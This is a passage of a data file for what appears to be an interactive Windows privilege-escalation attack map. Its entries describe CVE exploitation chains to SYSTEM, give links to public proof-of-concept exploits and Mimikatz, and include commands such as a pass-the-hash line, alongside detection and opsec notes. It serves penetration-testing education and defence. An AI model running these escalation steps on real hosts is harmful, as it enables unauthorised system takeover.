    description: r`An elevation-of-privilege flaw in the Ancillary Function Driver for WinSock (afd.sys) that yields a controlled arbitrary kernel WRITE. The CVE and its write primitive affect Windows 11 21H2/22H2 and Server 2022. The widely-used chompie1337 public PoC uses that write to corrupt IoRing (I/O Ring) registered-buffer structures into a full arbitrary kernel read/write primitive, then swaps the process token to SYSTEM; it only completes this chain on Windows 11 22H2, so other builds require porting the offsets. Fast and reliable where the PoC matches the build.`,
    tools: [{ name: 'chompie1337 PoC', url: 'https://github.com/chompie1337/Windows_LPE_AFD_CVE-2023-21768' }],
    mitre: mitre('T1068'),
    references: [
      { label: 'MSRC, CVE-2023-21768', url: 'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-21768' },
      { label: 'SentinelOne, CVE-2023-21768', url: 'https://www.sentinelone.com/blog/cve-2023-21768/' },
    ],
    requires: ['Unpatched Windows 11 22H2 / Server 2022 build'],
    opsec: 'Driver exploitation can be caught by HVCI/EDR; the wrong build risks a bugcheck.',
  },
  {
    id: 'pe-cve-2021-1732',
    label: 'CVE-2021-1732 (Win32k)',
    phase: 'finding',
    summary: 'Win32k out-of-bounds write → SYSTEM (in-the-wild).',
    affects: 'Windows 10 1803–20H2 and Server 2019, unpatched (pre-Feb 2021). Per NVD CPE data, Server 2016 is not affected, and 1903 (out of support at patch time) is not in the NVD/MSRC list.',
    versions: [...range('win10-1803', 'win10-20h2'), 'srv2019'],
    description: r`A Win32k elevation-of-privilege via an out-of-bounds write (CWE-787): a user-mode callback (NtUserConsoleControl / xxxClientAllocWindowClassExtraBytes) leaves the tagWND.WndExtra pointer and its is-offset flag out of sync, yielding kernel read/write and a token swap to SYSTEM. Originally exploited in the wild by the Bitter APT; the public KaLendsi PoC is validated on 1909 x64 and its offsets are build-specific, so other builds need porting.`,
    tools: [{ name: 'KaLendsi PoC', url: 'https://github.com/KaLendsi/CVE-2021-1732-Exploit' }],
    mitre: mitre('T1068'),
    references: [
      { label: 'MSRC, CVE-2021-1732', url: 'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1732' },
      { label: 'Google Project Zero, CVE-2021-1732 in-the-wild RCA', url: 'https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2021/CVE-2021-1732.html' },
    ],
    requires: ['Unpatched affected Windows 10 / Server build'],
    opsec: 'Kernel token manipulation is EDR-visible; the wrong build risks instability.',
  },
  {
    id: 'pe-cve-2020-0787',
    label: 'CVE-2020-0787 (BITS)',
    phase: 'finding',
    summary: 'BITS arbitrary file move → SYSTEM, no SeImpersonate.',
    affects: 'Windows 7 – Windows 10 1909 / Server 2008–2019, unpatched (pre-Mar 2020).',
    versions: [...range('win7', 'win10-1909'), 'srv2008', 'srv2012', 'srv2016', 'srv2019'],
    description: r`A symlink / arbitrary-file-move flaw in the Background Intelligent Transfer Service (BITS) that itm4n's exploit turns into an arbitrary file write as SYSTEM, then code execution. Works from a plain user without SeImpersonatePrivilege, across many Windows 7–10 builds.`,
    tools: [{ name: 'itm4n CVE-2020-0787 PoC', url: 'https://github.com/itm4n/CVEs/tree/master/CVE-2020-0787' }],
    mitre: mitre('T1068'),
    references: [
      { label: 'MSRC, CVE-2020-0787', url: 'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0787' },
      { label: 'itm4n, CVE-2020-0787', url: 'https://itm4n.github.io/cve-2020-0787-windows-bits-eop/' },
    ],
    requires: ['Unpatched Windows 7–10 / Server build', 'BITS service available'],
    opsec: 'Reliable and quiet relative to kernel exploits, but the file-move primitive and new SYSTEM process are detectable.',
  },
  {
    id: 'pe-bluehammer',
    label: 'BlueHammer (CVE-2026-33825)',
    phase: 'finding',
    summary: 'Race Defender remediation for a privileged file write → SYSTEM.',
    affects: 'Microsoft Defender Antimalware Platform before 4.18.26030.3011 (Windows 10/11, Server 2016-2025); patched April 2026, in CISA KEV.',
    description: r`CVE-2026-33825: insufficient access-control granularity in Microsoft Defender. A local user races a time-of-check / time-of-use window in Defender's threat-remediation engine, which writes files as SYSTEM without revalidating the path, to escalate to SYSTEM. Disclosed April 2026 alongside RedSun and UnDefend, patched in the April update, and listed in CISA's Known Exploited Vulnerabilities catalog. Awareness entry; exploitation specifics are intentionally omitted.`,
    mitre: mitre('T1068'),
    references: [
      { label: 'NVD, CVE-2026-33825', url: 'https://nvd.nist.gov/vuln/detail/CVE-2026-33825' },
      { label: 'MSRC, CVE-2026-33825', url: 'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-33825' },
    ],
    requires: ['A standard user session on a host with a vulnerable (pre-4.18.26030.3011) Defender platform'],
    opsec: 'Patched builds are immune; on unpatched hosts the remediation race and the new SYSTEM process are detectable.',
  },
  {
    id: 'pe-redsun',
    label: 'RedSun (CVE-2026-41091)',
    phase: 'finding',
    summary: 'Abuse Microsoft Defender cloud-file restore to write a file as SYSTEM (now patched).',
    affects: 'Windows 10/11 and Server 2019+ running Microsoft Defender before Malware Protection Engine 1.1.26040.8 / Antimalware Platform 4.18.26040.7; patched 2026-05-19, added to CISA KEV 2026-05-20.',
    description: r`A now-patched engine-level Windows privilege escalation (CVE-2026-41091, link-following / CWE-59), distinct from BlueHammer's plain remediation-write TOCTOU. During threat remediation Defender RESTORES (rather than quarantines) a cloud-tagged placeholder file, converted via the Windows Cloud Files API (cfapi/cldapi.dll), and does not revalidate the target path. A local user holds a batch oplock to pause the SYSTEM-privileged restore, then swaps in an NTFS junction that redirects the rewrite of the placeholder into a protected path (e.g. C:\Windows\System32\TieringEngineService.exe), landing code as SYSTEM. Disclosed April 2026, fixed in Defender Engine 1.1.26040.8 on 2026-05-19. Listed for awareness only; exploitation specifics are intentionally omitted.`,
    mitre: mitre('T1068'),
    references: [
      { label: 'NVD, CVE-2026-41091', url: 'https://nvd.nist.gov/vuln/detail/CVE-2026-41091' },
      { label: 'SOCRadar, BlueHammer / RedSun / UnDefend Defender 0-days', url: 'https://socradar.io/blog/bluehammer-redsun-undefend-windows-defender-0days/' },
      { label: 'Vectra, BlueHammer / RedSun / UnDefend in the wild', url: 'https://www.vectra.ai/blog/when-the-defender-becomes-the-door-bluehammer-redsun-and-undefend-in-the-wild' },
    ],
    requires: ['A standard user session on a host running an unpatched Microsoft Defender'],
    opsec: 'Triggering the exploit requires a Defender detection event (EICAR/malicious-file bait) that is itself logged, and success overwrites a signed System32 binary (TieringEngineService.exe); both are high-signal artifacts, not just a subtle path-confusion pattern.',
  },
  {
    id: 'pe-cve-2019-1388',
    label: 'CVE-2019-1388 (hhupd)',
    phase: 'finding',
    summary: 'UAC certificate dialog → SYSTEM browser → shell.',
    affects: 'Windows 7 through 10 1903 and Server 2008 through 2019, unpatched (pre-Nov 2019). Windows 10 1909 shipped with the fix. (1703 was already out of support at patch time and is not in the Nov 2019 advisory, though the code path was equally vulnerable.)',
    versions: [...range('win7', 'win10-1903'), 'srv2008', 'srv2012', 'srv2016', 'srv2019'],
    description: r`The Windows Certificate Dialog in the hhupd.exe UAC prompt failed to drop privileges when following the certificate's "Issued by" hyperlink. Clicking it opens Internet Explorer as SYSTEM; from there a Save-As / file dialog launches cmd.exe as SYSTEM. A one-click GUI escalation on unpatched Windows 7–10 / 2008–2019.`,
    tools: [{ name: 'CVE-2019-1388 PoC (hhupd.exe bundle)', url: 'https://github.com/jas502n/CVE-2019-1388' }],
    mitre: mitre('T1548.002'),
    references: [
      { label: 'MSRC, CVE-2019-1388', url: 'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-1388' },
      { label: 'ZDI, CVE-2019-1388', url: 'https://www.zerodayinitiative.com/blog/2019/11/19/thanksgiving-treat-easy-as-pie-windows-7-secure-desktop-escalation-of-privilege' },
    ],
    requires: ['Unpatched build', 'Ability to trigger the hhupd UAC dialog'],
    opsec: 'iexplore.exe running as SYSTEM with parent consent.exe (and a cmd.exe child) is the tell-tale anomaly; the canonical Sigma rule matches exactly this consent.exe -> iexplore.exe pair.',
  },

  // ── Shared mechanisms (where findings converge on SYSTEM) ───────────────────
  {
    id: 'pe-prim-service-exec',
    mitre: mitre('T1543.003'),
    references: [
      { label: 'HackTricks, Windows Local Privilege Escalation', url: 'https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html' },
    ],
    label: 'Service Executes Your Code',
    phase: 'system',
    hub: true,
    summary: 'A SYSTEM service launches your payload on (re)start.',
    description: r`Whether you rewrote a binPath, replaced the on-disk EXE, hijacked a DLL it loads, edited the service's registry key, reconfigured it as a Server Operator, or pointed a service plugin at your DLL (DnsAdmins), the outcome is identical. When the Service Control Manager next starts the service, it runs your code as its account, almost always LocalSystem.`,
    commands: [
      { label: 'Trigger the (re)start (sc stop returns at STOP_PENDING, so wait before starting)', code: r`sc stop <service> & timeout /t 5 & sc start <service>`, lang: 'cmd' },
    ],
    requires: ['Control over what a privileged service executes', 'Ability to (re)start the service or wait for a reboot'],
    opsec: 'Service install/change events (7045/7040) plus an unusual child process under services.exe are high-fidelity signals. Restore the original config afterward.',
  },
  {
    id: 'pe-prim-trigger',
    references: [
      { label: 'HackTricks, Windows Local Privilege Escalation', url: 'https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html' },
    ],
    label: 'Auto-Run Executes Your Code',
    phase: 'system',
    hub: true,
    summary: 'Code a higher-privileged context runs automatically.',
    description: r`Several misconfigs share one shape: a binary or script that a higher-privileged context executes, whether on a schedule, at logon, or via an accessibility hook (utilman/sethc), is writable by you, directly or after taking ownership. Overwrite it and wait for, or invoke, the trigger; your payload then runs as that principal.`,
    requires: ['A writable binary/script invoked automatically by a privileged context', 'The trigger fires: logon, schedule, lock screen, or you invoke it'],
    opsec: 'New/modified autorun, scheduled-task, or accessibility binaries are classic IOCs. The signals differ by vector: scheduled-task changes fire Event ID 4698/4702; autorun (Run key / Startup) changes surface as registry-modify (Sysmon Event ID 13 / Security 4657) and via Autoruns; accessibility-binary (utilman/sethc) overwrites surface as System32 file-create (Sysmon Event ID 11) and the image-load of the accessibility binary. Overwriting an existing target is quieter than creating one; restore it afterward.',
  },
  {
    "id": "pe-prim-kernel-exec",
    "label": "Kernel-Mode Code Execution",
    "phase": "system",
    "hub": true,
    "summary": "Distinguish processor execution mode from Windows account identity.",
    "description": "Kernel mode and user mode are processor execution modes. Applications use user mode; core operating-system components use kernel mode. LocalSystem is a Windows account identity with extensive local privileges. Processor mode and account identity describe different aspects of execution and should be recorded separately.",
    "mitre": {
      "id": "T1068",
      "url": "https://attack.mitre.org/techniques/T1068/"
    },
    "requires": [
      "A working kernel exploit, or a loadable vulnerable driver, for the exact OS build"
    ],
    "opsec": "BYOVD is increasingly PREVENTED outright by HVCI / Memory Integrity plus the Microsoft Vulnerable Driver Blocklist (default-on since Win11 22H2), which stops a blocklisted or unsigned driver from loading in the first place. Unsigned driver loads and ring-0 token manipulation are also high-signal EDR detections (Sysmon Event ID 6 unsigned loads, 7045 service creation), and instability risks a visible crash. Prefer a misconfig vector when one exists.",
    "references": [
      {
        "label": "Microsoft, User mode and kernel mode",
        "url": "https://learn.microsoft.com/en-us/windows-hardware/drivers/gettingstarted/user-mode-and-kernel-mode",
        "section": "Opening mode distinction; User mode; Kernel mode",
        "kind": "primary"
      },
      {
        "label": "Microsoft, LocalSystem Account",
        "url": "https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account",
        "section": "Opening account definition",
        "kind": "primary"
      }
    ],
    "review": {
      "status": "source-reviewed",
      "reviewedAt": "2026-09-07",
      "reviewedBy": "Codex",
      "reviewerType": "ai",
      "scope": "Selected conceptual claims about execution identities, processor modes, and task/startup permissions. Excludes commands, tools, prerequisites, applicability, connection outcomes, route viability, and ATT&CK mappings. Navigation labels remain project conventions.",
      "reviewedContent": {
        "description": "Kernel mode and user mode are processor execution modes. Applications use user mode; core operating-system components use kernel mode. LocalSystem is a Windows account identity with extensive local privileges. Processor mode and account identity describe different aspects of execution and should be recorded separately.",
        "hub": true,
        "id": "pe-prim-kernel-exec",
        "label": "Kernel-Mode Code Execution",
        "mitre": {
          "id": "T1068",
          "url": "https://attack.mitre.org/techniques/T1068/"
        },
        "opsec": "BYOVD is increasingly PREVENTED outright by HVCI / Memory Integrity plus the Microsoft Vulnerable Driver Blocklist (default-on since Win11 22H2), which stops a blocklisted or unsigned driver from loading in the first place. Unsigned driver loads and ring-0 token manipulation are also high-signal EDR detections (Sysmon Event ID 6 unsigned loads, 7045 service creation), and instability risks a visible crash. Prefer a misconfig vector when one exists.",
        "phase": "system",
        "references": [
          {
            "kind": "primary",
            "label": "Microsoft, User mode and kernel mode",
            "section": "Opening mode distinction; User mode; Kernel mode",
            "url": "https://learn.microsoft.com/en-us/windows-hardware/drivers/gettingstarted/user-mode-and-kernel-mode"
          },
          {
            "kind": "primary",
            "label": "Microsoft, LocalSystem Account",
            "section": "Opening account definition",
            "url": "https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account"
          }
        ],
        "requires": [
          "A working kernel exploit, or a loadable vulnerable driver, for the exact OS build"
        ],
        "summary": "Distinguish processor execution mode from Windows account identity."
      },
      "claims": [
        {
          "text": "Windows distinguishes user and kernel processor modes; applications use user mode and core operating-system components use kernel mode.",
          "section": "Microsoft, User mode and kernel mode — Opening mode distinction",
          "sources": [
            "https://learn.microsoft.com/en-us/windows-hardware/drivers/gettingstarted/user-mode-and-kernel-mode"
          ]
        },
        {
          "text": "LocalSystem is a predefined account identity with extensive privileges on the local computer.",
          "section": "Microsoft, LocalSystem Account — Opening account definition",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account"
          ]
        }
      ]
    }
  },
  {
    "id": "pe-recovered-creds",
    "label": "Recovered Credentials",
    "phase": "finding",
    "hub": true,
    "summary": "Distinguish authentication material from a process's security context.",
    "affects": "All supported Windows versions.",
    "description": "Passwords and password hashes are different kinds of data. NIST's password-storage model derives a hash from a password, salt, and cost factor. Windows uses access tokens to describe the identity, groups, and privileges of running processes or threads. Finding authentication material does not by itself describe the security context of a running process.",
    "tools": [
      {
        "name": "Mimikatz",
        "url": "https://github.com/gentilkiwi/mimikatz"
      },
      {
        "name": "NetExec",
        "url": "https://github.com/Pennyw0rth/NetExec"
      }
    ],
    "commands": [
      {
        "label": "Run as the recovered local user (cleartext)",
        "code": "runas /user:Administrator cmd.exe",
        "lang": "cmd"
      },
      {
        "label": "Pass-the-hash to a local admin shell (token injection, no network)",
        "code": "sekurlsa::pth /user:Administrator /domain:. /ntlm:<nthash> /run:cmd.exe",
        "lang": "cmd"
      }
    ],
    "mitre": {
      "id": "T1078",
      "url": "https://attack.mitre.org/techniques/T1078/"
    },
    "references": [
      {
        "label": "NIST SP 800-63B-4, Authenticators",
        "url": "https://pages.nist.gov/800-63-4/sp800-63b/authenticators/",
        "section": "3.1.1 Passwords; 3.1.1.2 Password Verifiers",
        "kind": "primary"
      },
      {
        "label": "Microsoft, Access tokens",
        "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens",
        "section": "Opening definition and access-token contents",
        "kind": "primary"
      },
      {
        "label": "HackTricks, Windows local privilege escalation",
        "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html"
      }
    ],
    "requires": [
      "A credential recovered from the host"
    ],
    "opsec": "Reusing a recovered local credential is quieter than exploitation but still logged; a mismatched account or source is the tell. The 4624 logon type varies by method: interactive runas is type 2; local pass-the-hash / over-PtH via sekurlsa::pth is type 9 (NewCredentials, seclogo); a network logon elsewhere with the reused hash is type 3.",
    "review": {
      "status": "source-reviewed",
      "reviewedAt": "2026-09-07",
      "reviewedBy": "Codex",
      "reviewerType": "ai",
      "scope": "Selected conceptual claims in the account, credential, and authentication explanation. Excludes commands, tools, prerequisites, applicability, connection outcomes, route viability, and ATT&CK mappings. Navigation labels remain project conventions.",
      "reviewedContent": {
        "affects": "All supported Windows versions.",
        "commands": [
          {
            "code": "runas /user:Administrator cmd.exe",
            "label": "Run as the recovered local user (cleartext)",
            "lang": "cmd"
          },
          {
            "code": "sekurlsa::pth /user:Administrator /domain:. /ntlm:<nthash> /run:cmd.exe",
            "label": "Pass-the-hash to a local admin shell (token injection, no network)",
            "lang": "cmd"
          }
        ],
        "description": "Passwords and password hashes are different kinds of data. NIST's password-storage model derives a hash from a password, salt, and cost factor. Windows uses access tokens to describe the identity, groups, and privileges of running processes or threads. Finding authentication material does not by itself describe the security context of a running process.",
        "hub": true,
        "id": "pe-recovered-creds",
        "label": "Recovered Credentials",
        "mitre": {
          "id": "T1078",
          "url": "https://attack.mitre.org/techniques/T1078/"
        },
        "opsec": "Reusing a recovered local credential is quieter than exploitation but still logged; a mismatched account or source is the tell. The 4624 logon type varies by method: interactive runas is type 2; local pass-the-hash / over-PtH via sekurlsa::pth is type 9 (NewCredentials, seclogo); a network logon elsewhere with the reused hash is type 3.",
        "phase": "finding",
        "references": [
          {
            "kind": "primary",
            "label": "NIST SP 800-63B-4, Authenticators",
            "section": "3.1.1 Passwords; 3.1.1.2 Password Verifiers",
            "url": "https://pages.nist.gov/800-63-4/sp800-63b/authenticators/"
          },
          {
            "kind": "primary",
            "label": "Microsoft, Access tokens",
            "section": "Opening definition and access-token contents",
            "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens"
          },
          {
            "label": "HackTricks, Windows local privilege escalation",
            "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html"
          }
        ],
        "requires": [
          "A credential recovered from the host"
        ],
        "summary": "Distinguish authentication material from a process's security context.",
        "tools": [
          {
            "name": "Mimikatz",
            "url": "https://github.com/gentilkiwi/mimikatz"
          },
          {
            "name": "NetExec",
            "url": "https://github.com/Pennyw0rth/NetExec"
          }
        ]
      },
      "claims": [
        {
          "text": "NIST describes password hashing schemes that derive a hash from a password, salt, and cost factor.",
          "section": "NIST SP 800-63B-4, Authenticators — 3.1.1.2 Password Verifiers",
          "sources": [
            "https://pages.nist.gov/800-63-4/sp800-63b/authenticators/"
          ]
        },
        {
          "text": "A Windows access token describes a process or thread's security context and includes account identity, group information, and privileges.",
          "section": "Microsoft, Access tokens — Opening definition and access-token contents",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens"
          ]
        }
      ]
    }
  },
];

/** @type {import('../schema.js').AttackEdge[]} */
export const peTechniqueEdges = [
  // Triage gate forks into account contexts (whoami /priv, /groups, and the account).
  { source: 'pe-start', target: 'pe-cat-priv' },
  { source: 'pe-start', target: 'pe-cat-admin' },
  { source: 'pe-start', target: 'pe-cat-enum' },
  { source: 'pe-start', target: 'pe-svc-account' },

  // Service account: hold the impersonation privilege (straight to the Potato hub),
  // or recover it first. The hub is pinned several ranks right (it is shared with the
  // token lane), so the direct edge is left uncaptioned to avoid dropping a label on
  // the Restore node that sits in between; the hub title already reads SeImpersonate.
  { source: 'pe-svc-account', target: 'pe-seimpersonate-potato' },
  { source: 'pe-svc-account', target: 'pe-localservice-fullpowers', label: 'missing SeImpersonate' },

  // Lane sub-folders.
  { source: 'pe-cat-priv', target: 'pe-cat-tokens' },
  { source: 'pe-cat-priv', target: 'pe-cat-groups' },
  { source: 'pe-cat-admin', target: 'pe-cat-uac', label: 'if medium integrity (UAC-filtered)' },
  { source: 'pe-cat-admin', target: 'pe-cat-admin2sys', label: 'if already high integrity' },
  { source: 'pe-cat-enum', target: 'pe-cat-creds' },
  { source: 'pe-cat-enum', target: 'pe-cat-services' },
  { source: 'pe-cat-enum', target: 'pe-cat-dll' },
  { source: 'pe-cat-enum', target: 'pe-cat-tasks' },
  { source: 'pe-cat-enum', target: 'pe-cat-apps' },
  { source: 'pe-cat-enum', target: 'pe-cat-cve' },

  // Folder -> technique.
  { source: 'pe-cat-tokens', target: 'pe-seimpersonate-potato' },
  { source: 'pe-cat-tokens', target: 'pe-sebackup-restore' },
  { source: 'pe-cat-tokens', target: 'pe-sedebug-lsass' },
  { source: 'pe-cat-tokens', target: 'pe-setakeownership' },
  { source: 'pe-cat-tokens', target: 'pe-seloaddriver' },
  { source: 'pe-cat-tokens', target: 'pe-semanagevolume' },
  { source: 'pe-cat-tokens', target: 'pe-setrustedcredman' },
  { source: 'pe-cat-tokens', target: 'pe-secreatetoken' },
  { source: 'pe-cat-tokens', target: 'pe-setcb' },
  { source: 'pe-cat-tokens', target: 'pe-serelabel' },
  { source: 'pe-cat-groups', target: 'pe-backup-operators' },
  { source: 'pe-cat-groups', target: 'pe-server-operators' },
  { source: 'pe-cat-groups', target: 'pe-dnsadmins' },
  { source: 'pe-cat-groups', target: 'pe-hyperv-admins' },
  { source: 'pe-cat-groups', target: 'pe-print-operators' },
  { source: 'pe-cat-groups', target: 'pe-event-log-readers' },
  { source: 'pe-cat-groups', target: 'pe-account-operators' },
  { source: 'pe-cat-groups', target: 'pe-admins-filtered' },
  { source: 'pe-cat-uac', target: 'pe-uac-fodhelper' },
  { source: 'pe-cat-uac', target: 'pe-uac-eventvwr' },
  { source: 'pe-cat-uac', target: 'pe-uac-sdclt' },
  { source: 'pe-cat-uac', target: 'pe-uac-computerdefaults' },
  { source: 'pe-cat-uac', target: 'pe-uac-cmstp' },
  { source: 'pe-cat-uac', target: 'pe-uac-silentcleanup' },
  { source: 'pe-cat-admin2sys', target: 'pe-admin-service-system' },
  { source: 'pe-cat-admin2sys', target: 'pe-admin-schtask-system' },
  { source: 'pe-cat-admin2sys', target: 'pe-admin-token' },
  // Stored Credentials grouped by where the secret lives.
  { source: 'pe-cat-creds', target: 'creds-registry' },
  { source: 'pe-cat-creds', target: 'creds-files' },
  { source: 'pe-cat-creds', target: 'creds-vaults' },
  { source: 'creds-registry', target: 'pe-sam-system-dump' },
  { source: 'creds-registry', target: 'pe-hivenightmare' },
  { source: 'creds-registry', target: 'pe-winlogon-autologon' },
  { source: 'creds-files', target: 'pe-stored-creds' },
  { source: 'creds-files', target: 'pe-powershell-history' },
  { source: 'creds-files', target: 'pe-config-password-hunt' },
  { source: 'creds-vaults', target: 'pe-dpapi-creds' },
  { source: 'creds-vaults', target: 'pe-password-managers' },
  { source: 'pe-cat-services', target: 'pe-unquoted-service-path' },
  { source: 'pe-cat-services', target: 'pe-weak-service-perms' },
  { source: 'pe-cat-services', target: 'pe-insecure-service-binary' },
  { source: 'pe-cat-services', target: 'pe-weak-registry-service' },
  { source: 'pe-cat-dll', target: 'pe-service-dll-hijack' },
  { source: 'pe-cat-dll', target: 'pe-path-dll-hijack' },
  { source: 'pe-cat-tasks', target: 'pe-autorun-writable' },
  { source: 'pe-cat-tasks', target: 'pe-scheduled-task-abuse' },
  { source: 'pe-cat-apps', target: 'pe-mssql-xpcmdshell' },
  { source: 'pe-cat-apps', target: 'pe-vuln-software' },
  { source: 'pe-cat-apps', target: 'pe-insecure-gui' },
  { source: 'pe-cat-apps', target: 'pe-printnightmare' },
  { source: 'pe-cat-apps', target: 'pe-always-install-elevated' },
  { source: 'pe-cat-cve', target: 'pe-kernel-enum' },
  { source: 'pe-cat-cve', target: 'pe-cve-2023-21768' },
  { source: 'pe-cat-cve', target: 'pe-cve-2021-1732' },
  { source: 'pe-cat-cve', target: 'pe-cve-2020-0787' },
  { source: 'pe-cat-cve', target: 'pe-cve-2019-1388' },
  { source: 'pe-cat-cve', target: 'pe-bluehammer' },
  { source: 'pe-cat-cve', target: 'pe-redsun' },

  // Transitions carry a shared `rel` (data/relationships.ts) that drives the
  // edge-panel explanation; no on-graph captions.

  // Privileged Users -> outcome.
  { source: 'pe-seimpersonate-potato', target: 'pe-pot-juicypotato' },
  { source: 'pe-seimpersonate-potato', target: 'pe-pot-printspoofer' },
  { source: 'pe-seimpersonate-potato', target: 'pe-pot-roguepotato' },
  { source: 'pe-seimpersonate-potato', target: 'pe-pot-godpotato' },
  { source: 'pe-localservice-fullpowers', target: 'pe-seimpersonate-potato', rel: 'enables', label: 'restores SeImpersonate' },
  { source: 'pe-pot-juicypotato', target: 'nt-system', rel: 'host-exec' },
  { source: 'pe-pot-printspoofer', target: 'nt-system', rel: 'host-exec' },
  { source: 'pe-pot-roguepotato', target: 'nt-system', rel: 'host-exec' },
  { source: 'pe-pot-godpotato', target: 'nt-system', rel: 'host-exec' },
  { source: 'pe-sebackup-restore', target: 'pe-sam-system-dump', rel: 'enables' },
  { source: 'pe-sedebug-lsass', target: 'nt-system', rel: 'host-exec' },
  { source: 'pe-setakeownership', target: 'pe-prim-trigger', rel: 'enables' },
  { source: 'pe-seloaddriver', target: 'pe-prim-kernel-exec', rel: 'enables' },
  { source: 'pe-semanagevolume', target: 'pe-prim-trigger', rel: 'enables', label: 'plant a DLL a SYSTEM process auto-loads' },
  { source: 'pe-setrustedcredman', target: 'pe-recovered-creds', rel: 'cred-reuse', label: 'Credential Manager store' },
  { source: 'pe-secreatetoken', target: 'nt-system', label: 'admin token, then SYSTEM' },
  { source: 'pe-setcb', target: 'nt-system', rel: 'host-exec' },
  { source: 'pe-serelabel', target: 'nt-system', rel: 'host-exec' },
  { source: 'pe-backup-operators', target: 'pe-sam-system-dump', rel: 'enables' },
  { source: 'pe-server-operators', target: 'pe-prim-service-exec', rel: 'enables' },
  { source: 'pe-dnsadmins', target: 'pe-prim-service-exec', rel: 'enables' },
  { source: 'pe-hyperv-admins', target: 'nt-system', rel: 'host-exec' },
  { source: 'pe-print-operators', target: 'pe-seloaddriver', rel: 'enables', label: 'load a driver' },
  { source: 'pe-event-log-readers', target: 'pe-recovered-creds', rel: 'cred-reuse', label: 'credentials from logs' },
  { source: 'pe-account-operators', target: 'nt-system', label: 'own a delegated non-protected account → SYSTEM via its rights (DCSync/GPO/admin)' },
  { source: 'pe-admins-filtered', target: 'pe-cat-uac', rel: 'enables', label: 'unfilter the token' },

  // Admin Users -> outcome.
  { source: 'pe-uac-fodhelper', target: 'pe-cat-admin2sys', label: 'now high-integrity admin' },
  { source: 'pe-uac-eventvwr', target: 'pe-cat-admin2sys', label: 'now high-integrity admin' },
  { source: 'pe-uac-sdclt', target: 'pe-cat-admin2sys', label: 'now high-integrity admin' },
  { source: 'pe-uac-computerdefaults', target: 'pe-cat-admin2sys', label: 'now high-integrity admin' },
  { source: 'pe-uac-cmstp', target: 'pe-cat-admin2sys', label: 'now high-integrity admin' },
  { source: 'pe-uac-silentcleanup', target: 'pe-cat-admin2sys', label: 'now high-integrity admin' },
  { source: 'pe-admin-service-system', target: 'nt-system', rel: 'host-exec' },
  { source: 'pe-admin-schtask-system', target: 'nt-system', rel: 'host-exec' },
  { source: 'pe-admin-token', target: 'nt-system', rel: 'host-exec' },

  // Stored Credentials -> reuse -> SYSTEM.
  { source: 'pe-sam-system-dump', target: 'pe-recovered-creds', rel: 'cred-reuse', label: 'local NTLM hashes' },
  { source: 'pe-dpapi-creds', target: 'pe-recovered-creds', rel: 'cred-reuse', label: 'DPAPI secrets' },
  { source: 'pe-stored-creds', target: 'pe-recovered-creds', rel: 'cred-reuse', label: 'saved credential' },
  { source: 'pe-winlogon-autologon', target: 'pe-recovered-creds', rel: 'cred-reuse', label: 'autologon password' },
  { source: 'pe-hivenightmare', target: 'pe-recovered-creds', rel: 'cred-reuse', label: 'local-admin hash' },
  { source: 'pe-powershell-history', target: 'pe-recovered-creds', rel: 'cred-reuse', label: 'secrets from history' },
  { source: 'pe-config-password-hunt', target: 'pe-recovered-creds', rel: 'cred-reuse', label: 'credentials in files' },
  { source: 'pe-password-managers', target: 'pe-recovered-creds', rel: 'cred-reuse', label: 'vault & browser logins' },
  { source: 'pe-recovered-creds', target: 'nt-system', rel: 'cred-reuse', label: 'if a local admin' },

  // Service / DLL / PATH -> "service executes your code" mechanism.
  { source: 'pe-unquoted-service-path', target: 'pe-prim-service-exec', rel: 'enables' },
  { source: 'pe-weak-service-perms', target: 'pe-prim-service-exec', rel: 'enables' },
  { source: 'pe-insecure-service-binary', target: 'pe-prim-service-exec', rel: 'enables' },
  { source: 'pe-weak-registry-service', target: 'pe-prim-service-exec', rel: 'enables' },
  { source: 'pe-service-dll-hijack', target: 'pe-prim-service-exec', rel: 'enables' },
  { source: 'pe-path-dll-hijack', target: 'pe-prim-service-exec', rel: 'enables' },

  // Tasks / autoruns -> "auto-run executes your code" mechanism.
  { source: 'pe-autorun-writable', target: 'pe-prim-trigger', rel: 'enables' },
  { source: 'pe-scheduled-task-abuse', target: 'pe-prim-trigger', rel: 'enables' },

  // App & service abuse -> outcome.
  { source: 'pe-mssql-xpcmdshell', target: 'pe-svc-account', rel: 'enables', label: 'runs as the SQL service account' },
  { source: 'pe-vuln-software', target: 'nt-system', rel: 'host-exec' },
  { source: 'pe-insecure-gui', target: 'nt-system', rel: 'host-exec' },
  { source: 'pe-printnightmare', target: 'nt-system', rel: 'host-exec' },

  { source: 'pe-always-install-elevated', target: 'nt-system', rel: 'host-exec' },

  // Known Exploits (CVE) -> outcome.
  { source: 'pe-kernel-enum', target: 'pe-kernel-exploit', rel: 'enables' },
  { source: 'pe-kernel-exploit', target: 'pe-prim-kernel-exec', rel: 'enables' },
  { source: 'pe-cve-2023-21768', target: 'pe-prim-kernel-exec', rel: 'enables' },
  { source: 'pe-cve-2021-1732', target: 'pe-prim-kernel-exec', rel: 'enables' },
  { source: 'pe-cve-2020-0787', target: 'nt-system', rel: 'host-exec' },
  { source: 'pe-cve-2019-1388', target: 'nt-system', rel: 'host-exec' },
  { source: 'pe-bluehammer', target: 'nt-system', rel: 'host-exec' },
  { source: 'pe-redsun', target: 'nt-system', rel: 'host-exec' },

  // Mechanisms -> SYSTEM.
  { source: 'pe-prim-service-exec', target: 'nt-system', rel: 'host-exec' },
  { source: 'pe-prim-trigger', target: 'nt-system', rel: 'host-exec' },
  { source: 'pe-prim-kernel-exec', target: 'nt-system', rel: 'host-exec' },
];
